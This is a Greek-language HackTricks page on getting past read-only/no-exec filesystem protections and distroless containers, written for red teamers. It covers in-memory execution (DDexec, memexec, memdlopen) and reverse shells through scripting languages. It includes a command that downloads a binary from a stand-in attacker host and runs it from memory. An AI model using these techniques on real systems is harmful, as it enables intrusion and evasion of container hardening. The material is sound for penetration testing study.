# Παράκαμψη προστασίας του συστήματος αρχείων: μόνο για ανάγνωση / χωρίς εκτέλεση / Distroless

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βίντεο

Στα παρακάτω βίντεο μπορείτε να βρείτε τις τεχνικές που αναφέρονται σε αυτήν τη σελίδα εξηγημένες πιο αναλυτικά:

* [**DEF CON 31 - Εξερεύνηση της Αλλοίωσης και Αποφυγής της Μνήμης του Linux**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Απόκρυψη εισβολών με το DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Σενάριο μόνο για ανάγνωση / χωρίς εκτέλεση

Είναι όλο και πιο συνηθισμένο να βρίσκονται linux μηχανές με **προστασία του συστήματος αρχείων μόνο για ανάγνωση (ro)**, ειδικά σε εμπορευματοκιβώτια. Αυτό συμβαίνει επειδή η εκτέλεση ενός εμπορευματοκιβωτίου με αρχείο συστήματος μόνο για ανάγνωση είναι τόσο εύκολη όσο η ρύθμιση **`readOnlyRootFilesystem: true`** στο `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ωστόσο, ακόμα κι αν το σύστημα αρχείων είναι προσαρτημένο ως ro, το **`/dev/shm`** θα παραμείνει εγγράψιμο, οπότε είναι ψεύτικο ότι δεν μπορούμε να γράψουμε οτιδήποτε στο δίσκο. Ωστόσο, αυτός ο φάκελος θα είναι **προσαρτημένος με προστασία χωρίς εκτέλεση**, οπότε αν κατεβάσετε ένα δυαδικό αρχείο εδώ **δεν θα μπορείτε να το εκτελέσετε**.

{% hint style="warning" %}
Από την πλευρά της κόκκινης ομάδας, αυτό καθιστά **δύσκολη τη λήψη και εκτέλεση** δυαδικών που δεν υπάρχουν ήδη στο σύστημα (όπως πίσω πόρτες ή εργαλεία απαρίθμησης όπως το `kubectl`).
{% endhint %}

## Ευκολότερη παράκαμψη: Σενάρια

Σημειώστε ότι αναφέρθηκα σε δυαδικά αρχεία, μπορείτε να **εκτελέσετε οποιοδήποτε σενάριο** όσο το διερμηνέας είναι μέσα στη μηχανή, όπως ένα **σενάριο κέλυφους** αν υπάρχει το `sh` ή ένα **σενάριο python** αν είναι εγκατεστημένο το `python`.

Ωστόσο, αυτό δεν είναι αρκετό για να εκτελέσετε τη δυαδική πίσω πόρτα ή άλλα δυαδικά εργαλεία που μπορεί να χρειαστεί να εκτελέσετε.

## Παράκαμψη μνήμης

Εάν θέλετε να εκτελέσετε ένα δυαδικό αρχείο αλλά το σύστημα αρχείων δεν το επιτρέπει, ο καλύτερος τρόπος να το κάνετε είναι να το **εκτελέσετε από τη μνήμη**, καθώς οι προστασίες δεν ισχύουν εκεί.

### Παράκαμψη FD + exec syscall

Εάν έχετε ισχυρούς μηχανισμούς σεναρίων μέσα στη μηχανή, όπως **Python**, **Perl** ή **Ruby**, μπορείτε να κατεβάσετε το δυαδικό αρχείο για εκτέλεση από τη μνήμη, να το αποθηκεύσετε σε έναν περιγραφέα αρχείου μνήμης (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες, και στη συνέχεια να καλέσετε ένα **`exec` syscall** δηλώνοντας τον **fd ως το αρχείο που θα εκτελεστεί**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ελέγξτε το Github ή:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένας **DDexec shellcode δαιμονισμένος**, οπότε κάθε φορά που θέλετε να **εκτελέσετε ένα διαφορετικό δυαδικό αρχείο** δεν χρειάζεται να ξαναξεκινήσετε το DDexec, μπορείτε απλά να εκτελέσετε τον κώδικα shell του memexec μέσω της τεχνικής DDexec και στη συνέχεια να **επικοινωνήσετε με αυτόν τον δαίμονα για να περάσετε νέα δυαδικά αρχεία για φόρτωση και εκτέλεση**.

Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε το **memexec για να εκτελέσετε δυαδικά αρχεία από ένα ανάποδο κέλυφος PHP** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης δυαδικών αρχείων** στη μνήμη για να τα εκτελέσετε αργότερα. Μπορεί ακόμα να επιτρέψει τη φόρτωση δυαδικών αρχείων με εξαρτήσεις.

## Διάβασμα Διανομής

### Τι είναι η διανομή

Οι διανομές χωρίς διανομές περιέχουν μόνο τα **απαραίτητα στοιχεία για να εκτελέσουν μια συγκεκριμένη εφαρμογή ή υπηρεσία**, όπως βιβλιοθήκες και εξαρτήσεις χρόνου εκτέλεσης, αλλά αποκλείουν μεγαλύτερα στοιχεία όπως ένας διαχειριστής πακέτων, κέλυφος ή δημόσιες υπηρεσίες.

Ο στόχος των διανομών χωρίς διανομές είναι να **μειώσουν την επιθετική επιφάνεια των διανομών αποκλείοντας περιττά στοιχεία** και μειώνοντας τον αριθμό των ευπαθειών που μπορούν να εκμεταλλευτούν.

### Ανάποδο Κέλυφος

Σε ένα δοχείο χωρίς διανομή, μπορεί **ακόμα και να μην βρείτε το `sh` ή το `bash`** για να πάρετε ένα κανονικό κέλυφος. Δεν θα βρείτε επίσης δυαδικά όπως `ls`, `whoami`, `id`... όλα όσα συνήθως εκτελείτε σε ένα σύστημα.

{% hint style="warning" %}
Συνεπώς, **δεν θα μπορέσετε** να πάρετε ένα **ανάποδο κέλυφος** ή να **απαριθμήσετε** το σύστημα όπως συνήθως.
{% endhint %}

Ωστόσο, αν το πειρατευμένο δοχείο εκτελεί για παράδειγμα έναν ιστότοπο flask, τότε έχει εγκατεστημένη την Python και, συνεπώς, μπορείτε να πάρετε ένα **ανάποδο κέλυφος Python**. Αν εκτελείτε τον κόμβο, μπορείτε να πάρετε ένα ανάποδο κέλυφος Node, και το ίδιο ισχύει για σχεδόν οποιαδήποτε **γλώσσα σεναρίων**.

{% hint style="success" %}
Χρησιμοποιώντας τη γλώσσα σεναρίων, μπορείτε να **απαριθμήσετε το σύστημα** χρησιμοποιώντας τις δυνατότητες της γλώσσας.
{% endhint %}

Αν δεν υπάρχουν προστασίες **`read-only/no-exec`**, μπορείτε να καταχραστείτε το ανάποδο κέλυφος σας για να **γράψετε στο σύστημα αρχεία δυαδικών** και να τα **εκτελέσετε**.

{% hint style="success" %}
Ωστόσο, σε αυτού του είδους τα δοχεία, αυτές οι προστασίες συνήθως υπάρχουν, αλλά μπορείτε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές εκτέλεσης στη μνήμη για να τις παρακάμψετε**.
{% endhint %}

Μπορείτε να βρείτε **παραδείγματα** για το πώς να **εκμεταλλευτείτε ορισμένες ευπάθειες RCE** για να πάρετε **ανάποδα κέλυφα γλωσσών σεναρίων** και να εκτελέσετε δυαδικά αρχεία από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σ
